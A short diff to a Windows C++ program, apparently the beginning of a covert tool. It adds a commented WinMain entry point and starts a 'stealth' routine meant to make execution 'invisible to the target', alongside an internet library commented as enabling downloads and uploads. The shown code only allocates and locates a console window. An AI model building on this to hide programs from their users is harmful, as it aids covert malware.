@@ -13,5 +13,19 @@
 #include <wininet.h> //Allow program to do internet options like downloading and uploading.
 #include <windowsx.h> //Allows to do extra macro functions to make windows program easier.
 
+//Let's Start the main function
+// This function is returning integer that why we specify int int the function.
+//Reason to specify 'APIENTRY' Para is every windows program consist of an entry point.
+//And it's also create API access to the program.
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
+{
+    //'HINSTANCE' - Used to handle an instance or a module(Executable) that was loaded in the memory.
+    //hPrev -  Used in 16-bit windows now it's always 0.
+    //Cmdline - UNICODE string act as an argument in the program.
+    //CmdShow - A flag to represent minimized or maximized in the function.
 
-int main();
+    //Let's Program to make program execution invisible to the target while execution.
+    HWND stealth;
+    AllocConsole();//Allocate new console to the calling process.
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+}
